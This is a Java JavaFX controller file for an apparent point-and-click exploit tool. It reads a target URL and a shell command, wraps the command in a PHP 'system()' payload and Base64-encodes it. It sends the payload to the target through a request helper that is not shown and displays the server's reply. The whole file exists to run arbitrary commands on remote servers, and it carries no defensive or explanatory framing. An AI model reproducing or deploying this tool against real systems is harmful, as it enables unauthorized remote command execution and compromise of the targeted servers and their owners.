package sample;

import java.awt.*;
import java.net.URI;
import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.scene.control.*;
import javafx.scene.control.TextArea;
import javafx.scene.control.TextField;
import sun.misc.BASE64Encoder;

import java.net.Proxy;

public class Controller {

    @FXML
    public TextArea Info_Tb;
    public TextField Target_Tb;
    public TextField Cmd_Tb;
    public String Target,Cmd,Payload;
    //public Proxy proxy;

    @FXML
    private void Exp_btnAction(ActionEvent event) throws Exception {
        //Info_Tb.appendText(Target_Tb.getText()+Name_Tb.getText()+Password_Tb.getText());
        Request request =new Request();
        Target = Target_Tb.getText().trim();
        Cmd = Cmd_Tb.getText().trim();
        Payload = "system('%s');";
        //proxy = request.setProxy("127.0.0.1",8080);
        if (Target.isEmpty() || Cmd.isEmpty()){
            Alert error = new Alert(Alert.AlertType.ERROR,"参数格式不合规,请检查后重试！");
            error.setHeaderText("参数不合规");
            error.show();
        }
        else {
            Cmd = encryptBASE64(String.format(Payload,Cmd)).replace("\r\n", "");
            Info_Tb.setText(request.sendGet(Target,"", null, Cmd));
        }
    }


    @FXML
    public void OpenAction(ActionEvent event) throws Exception{
        Desktop.getDesktop().browse(new URI("http://www.saferoad.cc/archives/341"));
        }

    /**
     * BASE64加密
     *
     * @param key
     * @return
     * @throws Exception
     */
    public static String encryptBASE64(String key) {
        byte[] bt = key.getBytes();
        return (new BASE64Encoder()).encodeBuffer(bt);
    }
}
